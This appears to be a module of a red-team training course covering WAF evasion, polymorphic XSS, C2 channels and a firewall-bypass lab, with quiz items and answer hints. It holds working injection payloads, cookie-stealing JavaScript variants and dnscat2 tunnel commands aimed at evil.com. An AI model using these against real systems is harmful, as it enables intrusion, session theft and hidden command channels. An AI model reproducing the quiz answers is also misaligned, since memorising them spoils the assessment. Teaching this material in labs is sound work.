title: Web Red Teaming
description: Evasion and advanced payloads vs WAF/IDS.

1.title: WAF bypass
1.body:
## The 7 layers of evasion

### 1. Encoding (the basics)

```text
' OR 1=1--                          ← the WAF sees this
%27%20OR%201%3D1--                  ← URL encoded
' UNION SELECT                       ← with normal spaces
'%09UNION%09SELECT                   ← with tabs instead of spaces
'/**/UNION/**/SELECT                 ← inline comments as separators
```

### 2. Hex encoding (MySQL)

```sql
-- Instead of: WHERE name='admin'
WHERE name=0x61646d696e             -- hex for 'admin'
```

### 3. HTTP headers (what the WAF forgets)

```bash
# The WAF inspects ?id=... but who inspects X-Forwarded-For?
curl -H "X-Forwarded-For: ' OR 1=1--" http://victima.com/perfil
curl -H "User-Agent: ' UNION SELECT 1,2,3--" http://victima.com/
curl -H "Referer: <script>alert(1)</script>" http://victima.com/
```

If the backend LOGS that header in SQL or reflects it in HTML → SQLi/XSS via headers.

### 4. Case randomization + interleaved comments

```sql
-- The WAF looks for "UNION SELECT" (case-insensitive)
SeLeCt                              ← case variation
UN/**/ION SE/**/LECT                ← interleaved comment
UnIoN/**/SeLeCt/**/1,2,3            ← both techniques combined
```

### 5. Chunked Transfer Encoding

The WAF needs to read the entire body to analyze it. `Transfer-Encoding: chunked`
splits the body into chunks that, individually, don't look like a payload.

### 6. HTTP Parameter Pollution

```text
?id=1&id=' OR 1=1--
```

Some backends take the LAST value, some the first — the WAF may only see the
first (clean) one while the backend processes the second (malicious) one.

### 7. Unicode/homoglyphs

```text
' (normal quote) → ‛ ′ ＇  (different Unicode codepoints)
```

The WAF looks for the ASCII quote; the backend normalizes Unicode → it gets through.

web-red-team-t01-q02.prompt: What HTTP feature can bypass parameter-only WAFs?

options.b: HTTP headers: X-Forwarded-For, User-Agent, Cookie — many WAFs don't inspect them

web-red-team-t01-q03.prompt: What SQL comment alternative to -- is less detected?

2.title: Polymorphic and C2
2.body:
## Polymorphic payloads: the chameleon

A polymorphic payload changes its representation on EVERY execution without changing what
it does. For JavaScript (XSS):

```javascript
// Original (detected by signatures):
document.cookie

// Polymorphic (equivalent, different shape):
// Option 1: string concatenation
document['cook'+'ie']

// Option 2: eval with hex
eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))

// Option 3: self-referencing
window[document.URL.split('/').pop().substring(0,8)]

// Option 4: time-based (only runs after a delay, evades the WAF sandbox)
setTimeout(()=>document.cookie, 3000)
```

The WAF looks for patterns (`document.cookie`, `alert(`) — polymorphism breaks them.

## C2: disguised command & control

C2 (Command and Control) is the channel through which the attacker controls the
compromised machine. In red teaming, it must look like LEGITIMATE traffic:

| Technique | How it works | Detection |
|---|---|---|
| **HTTP beacons** | The shell "calls home" via GET/POST to a domain that looks normal | inspecting User-Agent, timing patterns |
| **DNS tunneling** | Commands travel encoded in subdomains (`cmd.evil.com` → the DNS response contains data) | anomalies in DNS query volume |
| **ICMP tunneling** | Data in the ping payload | ICMP payload > 32 bytes |
| **Domain fronting** | Connecting to a legitimate CDN (cloudfront.net) with a different SNI | TLS inspection |

```bash
# DNS tunneling with dnscat2 (server):
dnscat2-server evil.com
# On the victim:
dnscat2 --dns server=8.8.8.8,domain=evil.com
```

## Operational Security (OPSEC) for the red teamer

1. **Jitter**: never beacon at exact intervals (300s ± 60s random)
2. **Rotating User-Agent**: switch between Chrome/Firefox/curl depending on the environment
3. **Domain aging**: register domains months before the engagement
4. **Kill dates**: all implants with an automatic expiration date
5. **Egress filtering awareness**: the SOC knows what goes out — mimic normal patterns

web-red-team-t02-q01.prompt: Which best describes a polymorphic payload?
web-red-team-t02-q01.hint: It changes shape on every run while keeping the same functionality.

options.a: A payload encrypted once that never changes again
options.b: A payload that only runs if it detects there is no WAF
options.c: A payload that changes shape on every run without changing its functionality
options.d: A payload digitally signed to prevent tampering

web-red-team-t02-q02.prompt: What C2 protocol disguises as HTTP?
web-red-team-t02-q02.hint: Cobalt Strike / Metasploit use HTTP/S as the transport.

3.title: Lab: pierce the firewall
3.body:
## Port rules ≠ security

The lab spins up three services behind "firewall rules":

```bash
cd labs/firewall-bypass && cp flags.env.example flags.env
docker compose --env-file flags.env up -d
# :18180 intranet (blocked) | :18443 gateway (allowed) | :18844 admin
```

### Evasion 1: tunnel through the trusted port

The rule says "443 allowed" — but a port doesn't know what it
carries. The lab's gateway forwards inward:

```bash
curl -s "http://127.0.0.1:18443/fetch?url=http://intranet.local/"
```

It's the same reason de facto C2 travels over 443 with legitimate-
looking mTLS: port-based policy is a fixed-height fence over
uneven terrain. Domain fronting, SSH over HTTPS, DNS over
HTTPS — they all live off this gap between "allowed" and "benign".

### Evasion 2: source port 53

The admin rule allowlists `--sport 53` (DNS), assuming only the
internal resolver would talk that way. Any attacker CHOOSES their
source port:

```python
# from inside the lab network (docker exec):
import socket
s = socket.socket()
s.bind(('0.0.0.0', 53))          # my source port is 53
s.connect(('127.0.0.1', 8443))   # the fw rule is satisfied
s.sendall(b'GET / HTTP/1.0\r\n\r\n')
print(s.recv(4096))
```

(From outside the docker network, NAT rewrites the source port —
that's why the lab is attacked from inside, like a real pivot. On a
flat enterprise network, `curl --local-port 53 http://target:8443/`
works directly.)

It's the kind of rule born from a 2011 ticket ("monitoring needs to
query") that survives three infrastructure teams. Correct rules
filter by identity (mTLS, tokens) and context, never by source port
number.

### The defender's diagnosis

`nmap` from outside shows: 80 filtered, 443 open, 8443 filtered.
"Secure", says the inventory. The 443 gateway and the sport-53
rule tell another story — this room's discussion is how that was
audited (internal pivoting + rule testing) before someone else did.

web-red-team-t03-q01.prompt: The intranet port 80 is blocked but 443 is open and relays. Extract the secret through the gateway. Submit the flag.
web-red-team-t03-q01.hint: curl "http://127.0.0.1:18443/fetch?url=http://intranet.local/" — the firewall trusts the port, not the content

web-red-team-t03-q02.prompt: The admin service (:18844) only accepts connections whose SOURCE port is 53. Connect that way (from inside the lab network) and submit the flag.
web-red-team-t03-q02.hint: docker exec into the container + a python socket with bind(('', 53)) → the --sport 53 allow rule is one of the oldest firewall mistakes
